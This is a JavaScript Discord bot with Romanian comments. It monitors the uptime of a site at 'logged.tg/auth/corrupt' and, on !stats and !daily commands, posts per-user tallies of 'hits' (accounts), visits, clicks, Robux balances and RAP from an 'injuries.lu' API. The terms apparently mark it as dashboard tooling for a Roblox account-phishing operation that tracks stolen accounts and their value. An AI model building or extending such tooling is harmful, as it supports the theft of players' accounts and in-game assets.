// 1️⃣ Importuri
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const fetch = require('node-fetch');
const express = require('express');

// 2️⃣ Server Express pentru keep-alive
const app = express();
const PORT = process.env.PORT || 3000;
app.get("/", (req, res) => res.send("Bot is alive ✅"));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

// 3️⃣ Creezi clientul Discord
const client = new Client({ 
  intents: [
    GatewayIntentBits.Guilds, 
    GatewayIntentBits.GuildMessages, 
    GatewayIntentBits.MessageContent
  ] 
});

const TOKEN = process.env.DISCORD_BOT_TOKEN;

// 4️⃣ Eveniment ready
client.once('ready', () => {
  console.log(`✅ Bot ready as ${client.user.tag}`);
});

// 5️⃣ Funcții utile
function formatNumber(num) { return num?.toLocaleString() || "0"; }
function formatDuration(ms) {
  let sec = Math.floor(ms / 1000);
  let min = Math.floor(sec / 60);
  let hr = Math.floor(min / 60);
  sec %= 60; min %= 60;
  return `${hr}h ${min}m ${sec}s`;
}

// 5.1️⃣ Uptime Monitor Config
let lastUpTime = null;
let lastStatus = null; 
const STATUS_CHANNEL_ID = "1436098432413597726";
const MAIN_SITE_URL = "https://www.logged.tg/auth/corrupt";
const MAIN_SITE_NAME = "MAIN SITE";

// Auto-check site la fiecare 30 sec
setInterval(async () => {
  try {
    const start = Date.now();
    let res, ping;
    try { const response = await fetch(MAIN_SITE_URL); res = { ok: response.ok }; ping = Date.now() - start; } 
    catch { res = { ok: false }; ping = null; }

    let currentStatus = res.ok ? "UP" : "DOWN";
    if (res.ok && !lastUpTime) lastUpTime = Date.now();
    if (!res.ok) lastUpTime = null;

    if (currentStatus !== lastStatus) {
      const channel = client.channels.cache.get(STATUS_CHANNEL_ID);
      if (channel) {
        const statusEmoji = res.ok ? "<a:corrupt_verify:1437152885480886312>" : "❌";
        const embed = new EmbedBuilder()
          .setColor(0x1ABC9C)
          .setTitle(`— <a:emoji_22:1437165310775132160> SITE STATUS —`)
          .setThumbnail("<a:corrupt_crown:1437152941088702607>") // coroana dreapta sus
          .setDescription(
`<a:emoji_21:1437163698161717468> **${MAIN_SITE_NAME}**
<a:emoji_21:1437163698161717468> Status: ${currentStatus} ${statusEmoji}
<a:emoji_21:1437163698161717468> Uptime: ${res.ok && lastUpTime ? formatDuration(Date.now() - lastUpTime) : "❌ No uptime data"}
<a:emoji_21:1437163698161717468> Response Time: ${ping ? ping + "ms" : "N/A"}`
          )
          .setImage("https://i.imgur.com/8ybiT0H.gif") // banner jos
          .setFooter({ text: "Site Uptime Monitor" });

        await channel.send({ embeds: [embed] });
      }
      lastStatus = currentStatus;
    }
  } catch (err) { console.error(err); }
}, 30000);

// 6️⃣ Event listener pentru mesaje
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  const targetUser = message.mentions.users.first() || message.author;
  const targetId = targetUser.id;

  async function sendStatsEmbed(titleText, statsData, footerText) {
    const embed = new EmbedBuilder()
      .setColor(0x1ABC9C)
      .setTitle(`— <a:emoji_22:1437165310775132160> ${titleText} —`)
      .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 })) // poza utilizatorului
      .setDescription(
`<a:emoji_21:1437163698161717468> **User:** ${targetUser.username}

<a:emoji_21:1437163698161717468> **TOTAL STATS:** 
\`\`\`
Hits:     ${formatNumber(statsData.Totals?.Accounts)}
Visits:   ${formatNumber(statsData.Totals?.Visits)}
Clicks:   ${formatNumber(statsData.Totals?.Clicks)}
\`\`\`

<a:emoji_21:1437163698161717468> **BIGGEST HIT:** 
\`\`\`
Summary:  ${formatNumber(statsData.Highest?.Summary)}
RAP:      ${formatNumber(statsData.Highest?.Rap)}
Robux:    ${formatNumber(statsData.Highest?.Balance)}
\`\`\`

<a:emoji_21:1437163698161717468> **TOTAL HIT STATS:** 
\`\`\`
Summary:  ${formatNumber(statsData.Totals?.Summary)}
RAP:      ${formatNumber(statsData.Totals?.Rap)}
Robux:    ${formatNumber(statsData.Totals?.Balance)}
\`\`\``
      )
      .setImage("https://i.imgur.com/8ybiT0H.gif") // banner jos
      .setFooter({ text: footerText });

    await message.channel.send({ embeds: [embed] });
  }

  // ===== !stats =====
  if (message.content.startsWith('!stats')) {
    try {
      const res = await fetch(`https://api.injuries.lu/v1/public/user?userId=${targetId}`);
      const data = await res.json();
      if (!data.success || !data.Normal) { message.reply("❌ No stats found."); return; }
      await sendStatsEmbed("NORMAL INFO", data.Normal, "Stats Bot");
    } catch { message.reply("❌ Error fetching stats."); }
  }

  // ===== !daily =====
  if (message.content.startsWith('!daily')) {
    try {
      const res = await fetch(`https://api.injuries.lu/v1/public/user?userId=${targetId}`);
      const data = await res.json();
      const daily = data.Daily || data.Normal;
      await sendStatsEmbed("DAILY STATS", daily, "Stats Bot Daily");
    } catch { message.reply("❌ Error fetching daily stats."); }
  }

  // ===== !check & announces =====
  if (message.content.startsWith('!check') || message.content.startsWith('!announces')) {
    try {
      const start = Date.now();
      let res, ping;
      try { const response = await fetch(MAIN_SITE_URL); res = { ok: response.ok }; ping = Date.now() - start; } 
      catch { res = { ok: false }; ping = null; }

      const statusEmoji = res.ok ? "<a:corrupt_verify:1437152885480886312>" : "❌";
      const uptimeText = res.ok && lastUpTime ? formatDuration(Date.now() - lastUpTime) : "❌ No uptime data";

      const embed = new EmbedBuilder()
        .setColor(0x1ABC9C)
        .setTitle(`— <a:emoji_22:1437165310775132160> SITE STATUS —`)
        .setThumbnail("<a:corrupt_crown:1437152941088702607>") // coroana dreapta sus
        .setDescription(
`<a:emoji_21:1437163698161717468> **${MAIN_SITE_NAME}**
<a:emoji_21:1437163698161717468> Status: ${res.ok ? "ONLINE" : "OFFLINE"} ${statusEmoji}
<a:emoji_21:1437163698161717468> Uptime: ${uptimeText}
<a:emoji_21:1437163698161717468> Response Time: ${ping ? ping + "ms" : "N/A"}`
        )
        .setImage("https://i.imgur.com/8ybiT0H.gif") // banner jos
        .setFooter({ text: "Site Uptime Monitor" });

      await message.channel.send({ embeds: [embed] });

    } catch (err) { console.error(err); }
  }
});

// 7️⃣ Error handler
client.on('error', (error) => console.error('Discord client error:', error));

// 8️⃣ Verificare token
if (!TOKEN) { console.error('❌ DISCORD_BOT_TOKEN is not set!'); process.exit(1); }

// 9️⃣ Login bot
client.login(TOKEN);
